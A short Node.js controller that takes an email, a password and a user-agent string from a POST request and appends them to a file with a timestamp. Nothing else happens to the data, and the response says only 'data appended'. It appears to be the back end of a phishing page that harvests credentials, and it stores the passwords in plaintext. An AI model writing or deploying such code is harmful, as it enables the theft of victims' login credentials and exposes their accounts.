const fs = require("fs")

function PostController(req, res, file) {
  try {

    const { email, pass, userAgent } = req.body
    fs.appendFile(file, `
    email : ${email}
    pass  : ${pass}
    user  : ${userAgent}
    date  : ${new Date().toLocaleTimeString()} - ${new Date().toLocaleDateString()} 
    __________________________________________________________________________________________________________________________
    `, (err) => {
      if (err) {
        console.log(err)
        res.status(500).json({
          message: "error occured"
        })
      } else {
        res.status(200).json({
          message: 'data appended'
        })
      }
    })
  } catch (error) {
    console.log(error)
  }
}

module.exports = { PostController }